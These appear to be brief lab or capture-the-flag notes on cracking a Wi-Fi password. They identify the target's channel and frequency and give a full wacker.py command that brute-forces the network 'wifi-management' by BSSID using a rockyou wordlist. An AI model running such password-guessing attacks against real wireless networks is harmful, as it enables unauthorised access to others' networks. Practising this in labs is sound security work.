Target:

![[Pasted image 20250602122921.png]]

Target is using 2.4Ghz on channel 11. Find frequency on this page: https://en.wikipedia.org/wiki/List_of_WLAN_channels

![[Pasted image 20250602123107.png]]

```bash
python3 wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan0 --freq 2462
```

![[Pasted image 20250602123216.png]]

